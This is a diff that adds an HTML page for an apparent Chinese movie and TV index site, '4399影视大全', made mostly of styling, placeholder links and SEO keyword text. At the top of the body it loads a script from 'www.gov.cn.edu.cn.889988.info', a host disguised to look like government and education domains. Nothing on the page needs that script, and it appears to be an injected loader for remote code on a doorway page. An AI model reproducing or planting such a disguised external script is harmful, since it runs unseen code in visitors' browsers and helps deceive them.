@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>4399影视大全 - 海量影视资源分类索引</title>
+<meta name="keywords" content="4399影视大全, 4399影视, 影视大全, 4399yingshidaquan-h5" />
+<meta name="description" content="4399影视大全（4399yingshidaquan-h5）是一个影视资源分类索引站，涵盖电影、剧集、动漫、综艺、纪录片与短剧，界面简洁、移动端自适应。" />
+<style>
+    :root{
+        --yellow:#ffcf0f;
+        --yellow-deep:#f5b800;
+        --ink:#1c1c1e;
+        --grey:#f2f2f2;
+        --line:#e0e0e0;
+        --muted:#666;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{
+        background:#fff;
+        color:var(--ink);
+        font-family:"PingFang SC","Microsoft YaHei",Arial,sans-serif;
+        line-height:1.7;
+    }
+    a{color:#e65c00;text-decoration:none;}
+
+    /* 顶部搜索门面 */
+    .topbar{
+        background:var(--ink);
+        padding:26px 16px 22px;
+        text-align:center;
+        color:#fff;
+    }
+    .brand{
+        font-size:32px;
+        font-weight:900;
+        letter-spacing:1px;
+        color:var(--yellow);
+    }
+    .brand small{
+        display:block;
+        margin-top:6px;
+        font-size:13px;
+        color:#bbb;
+        font-weight:400;
+        letter-spacing:2px;
+    }
+    .search-box{
+        margin:16px auto 0;
+        max-width:480px;
+        display:flex;
+        background:#fff;
+        border-radius:999px;
+        overflow:hidden;
+        border:2px solid var(--yellow);
+    }
+    .search-box input{
+        flex:1;
+        border:none;
+        outline:none;
+        padding:10px 14px;
+        font-size:14px;
+    }
+    .search-box button{
+        border:none;
+        background:var(--yellow);
+        color:#000;
+        font-weight:700;
+        padding:0 18px;
+        cursor:pointer;
+    }
+
+    /* 分类入口 */
+    .cats{
+        display:grid;
+        grid-template-columns:repeat(auto-fit,minmax(130px,1fr));
+        gap:10px;
+        max-width:1000px;
+        margin:18px auto;
+        padding:0 14px;
+    }
+    .cat{
+        background:var(--grey);
+        border:1px solid var(--line);
+        border-radius:10px;
+        padding:14px 10px;
+        text-align:center;
+    }
+    .cat b{
+        display:block;
+        font-size:16px;
+        color:#222;
+    }
+    .cat span{
+        font-size:12px;
+        color:var(--muted);
+    }
+
+    .wrap{
+        max-width:1000px;
+        margin:auto;
+        padding:0 14px 30px;
+    }
+
+    .sec-title{
+        font-size:19px;
+        margin:24px 0 12px;
+        padding-left:10px;
+        border-left:5px solid var(--yellow-deep);
+    }
+
+    /* 字母索引 */
+    .az{
+        display:flex;
+        flex-wrap:wrap;
+        gap:6px;
+    }
+    .az a{
+        width:34px;height:34px;
+        display:flex;align-items:center;justify-content:center;
+        background:var(--grey);
+        border-radius:6px;
+        font-size:13px;
+        color:#333;
+        font-weight:700;
+    }
+
+    /* 卡片墙 */
+    .wall{
+        display:grid;
+        grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+        gap:12px;
+    }
+    .item{
+        border:1px solid var(--line);
+        border-radius:10px;
+        padding:12px;
+        background:#fafafa;
+    }
+    .item b{
+        font-size:15px;
+        color:#222;
+    }
+    .item p{
+        font-size:12px;
+        color:var(--muted);
+        margin-top:4px;
+    }
+
+    /* 页脚 */
+    .foot{
+        margin-top:28px;
+        padding:18px 14px;
+        text-align:center;
+        font-size:13px;
+        color:var(--muted);
+        background:var(--ink);
+        color:#aaa;
+    }
+
+    @media (max-width:600px){
+        .brand{font-size:26px;}
+        .search-box button{padding:0 12px;}
+    }
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+    <div class="brand">
+        4399影视大全
+        <small>4399YINGSHIDAQUAN · 影视资源分类索引</small>
+    </div>
+    <div class="search-box">
+        <input type="text" placeholder="搜索影片、剧集、演员..." />
+        <button>搜索</button>
+    </div>
+</header>
+
+<nav class="cats">
+    <a class="cat" href="#"><b>电影</b><span>院线 · 经典</span></a>
+    <a class="cat" href="#"><b>剧集</b><span>国产 · 美剧</span></a>
+    <a class="cat" href="#"><b>动漫</b><span>国漫 · 日漫</span></a>
+    <a class="cat" href="#"><b>综艺</b><span>真人秀 · 访谈</span></a>
+    <a class="cat" href="#"><b>纪录片</b><span>自然 · 历史</span></a>
+    <a class="cat" href="#"><b>短剧</b><span>竖屏 · 爽剧</span></a>
+</nav>
+
+<main class="wrap">
+
+    <h2 class="sec-title">热门推荐</h2>
+    <section class="wall">
+        <div class="item"><b>热门电影</b><p>动作 · 喜剧 · 科幻</p></div>
+        <div class="item"><b>热播剧集</b><p>连续更新中</p></div>
+        <div class="item"><b>高分动漫</b><p>国漫精选</p></div>
+        <div class="item"><b>综艺娱乐</b><p>轻松下饭</p></div>
+        <div class="item"><b>纪录佳作</b><p>开阔视野</p></div>
+        <div class="item"><b>竖屏短剧</b><p>节奏快</p></div>
+    </section>
+
+    <h2 class="sec-title">首字母索引</h2>
+    <nav class="az">
+        <a href="#">A</a><a href="#">B</a><a href="#">C</a><a href="#">D</a>
+        <a href="#">E</a><a href="#">F</a><a href="#">G</a><a href="#">H</a>
+        <a href="#">J</a><a href="#">K</a><a href="#">L</a><a href="#">M</a>
+        <a href="#">N</a><a href="#">P</a><a href="#">Q</a><a href="#">R</a>
+        <a href="#">S</a><a href="#">T</a><a href="#">W</a><a href="#">X</a>
+        <a href="#">Y</a><a href="#">Z</a>
+    </nav>
+
+    <h2 class="sec-title">关于 4399影视大全</h2>
+    <section class="item" style="max-width:100%;background:#fff8dc;border-color:#f5d76e;">
+        <b>站点简介</b>
+        <p>
+            4399影视大全（4399yingshidaquan-h5）是一个影视资源分类索引站，
+            以“找片更快”为核心，提供电影、剧集、动漫、综艺、纪录片、短剧等多类入口，
+            页面轻量、结构清晰，适合移动端浏览与搜索引擎收录。
+        </p>
+    </section>
+
+    <h2 class="sec-title">访问说明</h2>
+    <section class="item" style="max-width:100%;">
+        <b>官方地址</b>
+        <p>https://4399yingshidaquan-h5.github.io</p>
+        <p>本站为单页结构，所有内页链接以 # 占位，移动端自动适配。</p>
+    </section>
+
+</main>
+
+<footer class="foot">
+    © 2026 4399影视大全 · 4399yingshidaquan-h5.github.io · 单页索引模板
+</footer>
+
+</body>
+</html>
